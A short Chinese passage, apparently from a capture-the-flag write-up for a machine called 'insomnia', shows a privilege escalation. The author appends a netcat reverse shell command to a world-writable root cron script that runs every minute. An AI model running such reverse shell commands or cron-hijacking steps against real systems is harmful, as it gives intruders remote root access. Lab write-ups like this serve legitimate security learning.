发现/bin/bash /var/cron/check.sh文件，每分钟都会定时执行，

查看一下文件属性和文件内容

julia@insomnia:~$ ls -la /var/cron/check.sh
-rwxrwxrwx 1 root root 153 Dec 21  2020 /var/cron/check.sh
julia@insomnia:~$ cat /var/cron/check.sh
#!/bin/bash
status=$(systemctl is-active insomnia.service)
if [ "$status" == "active"  ]; then
   echo "OK"
else
   systemctl start  insomnia.service
fi

因此尝试跟刚才一样的方法，追加一个反弹shell的语句到这个文件内

julia@insomnia:~$ echo 'nc -e /bin/bash 192.168.161.76 7777' >> /var/cron/check.sh
julia@insomnia:~$ cat /var/cron/check.sh
#!/bin/bash
status=$(systemctl is-active insomnia.service)
if [ "$status" == "active"  ]; then
   echo "OK"
else
   systemctl start  insomnia.service
fi
nc -e /bin/bash 192.168.161.76 7777

这里可以看到已经追加了一条命令，然后这个文件是定时执行，因此只需等待即可
